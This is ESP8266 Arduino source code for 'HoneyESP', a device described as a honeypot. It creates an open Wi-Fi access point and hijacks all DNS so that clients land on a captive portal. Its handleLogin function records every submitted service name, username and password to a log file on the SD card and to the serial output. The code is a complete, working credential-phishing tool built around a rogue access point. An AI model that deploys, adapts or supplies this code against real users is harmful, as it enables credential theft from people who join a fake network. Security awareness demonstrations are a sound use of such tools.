#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <SPI.h>
#include <SD.h>

#define SDCARD_CS_PIN SS
#define DNS_PORT 53
#define HTTP_PORT 80
#define BLOCK_SSID_REQUEST
#define DEFAULT_SSID_PREFIX "HoneyESP-"
#define AP_ADDRESS "10.0.0.1"
#define AP_NETMASK "255.255.255.0"
#define AP_CHANNEL 1
#define AP_MAX_CLIENTS 8
#define HOSTNAME "wifi-gateway.local"
#define FILENAME_SSID "ssid.txt"
#define FILENAME_DATALOG "datalog.txt"

DNSServer dnsServer;
ESP8266WebServer server(HTTP_PORT);
int lastClientCount = -1;

void setup() {
  // Finish initialization of ESP
  delay(1000);

  // Print banner
  Serial.begin(9600);
  Serial.println();
  Serial.println(" _   _                        _____ ____  ____");
  Serial.println("| | | | ___  _ __   ___ _   _| ____/ ___||  _ \\  ESP8266 honeypot version 1.5");
  Serial.println("| |_| |/ _ \\| '_ \\ / _ \\ | | |  _| \\___ \\| |_) | SD Card Version");
  Serial.println("|  _  | (_) | | | |  __/ |_| | |___ ___) |  __/  github.com/ridercz/HoneyESP");
  Serial.println("|_| |_|\\___/|_| |_|\\___|\\__, |_____|____/|_|     (c) 2018-2019 Michal Altair Valasek");
  Serial.println("                        |___/                    www.altairis.cz | www.rider.cz");
  Serial.println();

  // Initialize SD card
  Serial.print("Initializing SD card...");
  if (SD.begin(SDCARD_CS_PIN)) {
    Serial.println("OK");
  } else {
    Serial.println("Failed!");
    Serial.println("System halted.");
    while (true);
  }

  // Create SSID
  String ssid = DEFAULT_SSID_PREFIX + WiFi.softAPmacAddress();
  if (SD.exists(FILENAME_SSID)) {
    File ssidFile = SD.open(FILENAME_SSID);
    ssid = ssidFile.readString();
    ssidFile.close();
    Serial.print("  SSID:             "); Serial.println(ssid);
  } else {
    Serial.print("  SSID (generated): "); Serial.println(ssid);
  }
  Serial.print("  MAC:              "); Serial.println(WiFi.softAPmacAddress());
  Serial.print("  Host name:        "); Serial.println(HOSTNAME);

  // Parse IP address and netmask
  IPAddress ip, nm;
  ip.fromString(AP_ADDRESS);
  nm.fromString(AP_NETMASK);

  // Configure AP
  Serial.print("Configuring access point...");
  WiFi.softAPConfig(ip, ip, nm);
  WiFi.softAP(ssid.c_str(), "", AP_CHANNEL, false, AP_MAX_CLIENTS);
  Serial.println("OK");

  // Write delimiter to data file
  Serial.print("Writing data log...");
  File logFile = SD.open(FILENAME_DATALOG, FILE_WRITE);
  if (logFile) {
    logFile.print("; SSID = ");
    logFile.println(ssid);
    logFile.close();
    Serial.println("OK");
  } else {
    Serial.println("Failed!");
    Serial.println("System halted.");
    while (true);
  }

  // Set redirection of all DNS queries to itself
  Serial.print("Configuring DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", ip);
  Serial.println("OK");

  // Enable HTTP server
  Serial.print("Starting HTTP server...");
  server.on("/login.htm", handleLogin);
#ifdef BLOCK_DATALOG_REQUEST
  server.on(getUrlFromFileName(FILENAME_DATALOG), send404);
#endif
#ifdef BLOCK_SSID_REQUEST
  server.on(getUrlFromFileName(FILENAME_SSID), send404);
#endif
  server.onNotFound(handleRequest);
  server.begin();
  Serial.println("OK");
  Serial.println();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  int currentClientCount = WiFi.softAPgetStationNum();
  if (lastClientCount != currentClientCount) {
    lastClientCount = currentClientCount;
    Serial.print("Connected clients: ");
    Serial.println(currentClientCount);
  }
}

void handleLogin() {
  // Save form data to text file
  File logFile = SD.open(FILENAME_DATALOG, FILE_WRITE);
  if (logFile) {
    String logLine = server.arg("svc");
    logLine += "\t" + server.arg("usr");
    logLine += "\t" + server.arg("pwd");
    Serial.println(logLine);
    logFile.println(logLine);
    logFile.close();
  } else {
    Serial.println("Error opening data file.");
  }

  // Redirect to error page
  String message = "<html><head><title>302 Found</title></head><body><a href=\"/error.htm\">Continue here</a></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("Location", "/error.htm");
  server.send(302, "text/html", message);
}

void handleRequest() {
  if (server.hostHeader() != HOSTNAME) redirectToCaptivePortal();
  if (sendFileFromSD(server.uri())) return;
  send404();
}

void send404() {
  String message = "<html><head><title>404 Object Not Found</title></head><body><h1>404 Object Not Found</h1></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(404, "text/html", message);
}

void redirectToCaptivePortal() {
  String location = "http://";
  location += HOSTNAME;
  location += "/";

  String message = "<html><head><title>302 Found</title></head><body><a href=\"" + location + "\">Continue here</a></body></html>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("Location", location);
  server.send(302, "text/html", message);
}

bool sendFileFromSD(String path) {
  // Append index.htm to directory requests
  if (path.endsWith("/")) path += "index.htm";

  // Determine MIME type
  String dataType = "application/octet-stream";
  if (path.endsWith(".htm")) {
    dataType = "text/html";
  } else if (path.endsWith(".css")) {
    dataType = "text/css";
  } else if (path.endsWith(".js")) {
    dataType = "application/javascript";
  } else if (path.endsWith(".png")) {
    dataType = "image/png";
  } else if (path.endsWith(".gif")) {
    dataType = "image/gif";
  } else if (path.endsWith(".jpg")) {
    dataType = "image/jpeg";
  } else if (path.endsWith(".ico")) {
    dataType = "image/x-icon";
  } else if (path.endsWith(".txt")) {
    dataType = "text/plain";
  }

  // Find appropriate file on SD card
  File dataFile = SD.open(path.c_str());
  if (dataFile.isDirectory()) {
    path += "/index.htm";
    dataType = "text/html";
    dataFile = SD.open(path.c_str());
  }

  // If not exists, do nothing
  if (!dataFile) return false;

  // Stream the resulting file
  server.streamFile(dataFile, dataType);
  dataFile.close();
  return true;
}

const char* getUrlFromFileName(const char* fileName) {
  String url = "/";
  url += fileName;
  return url.c_str();
}
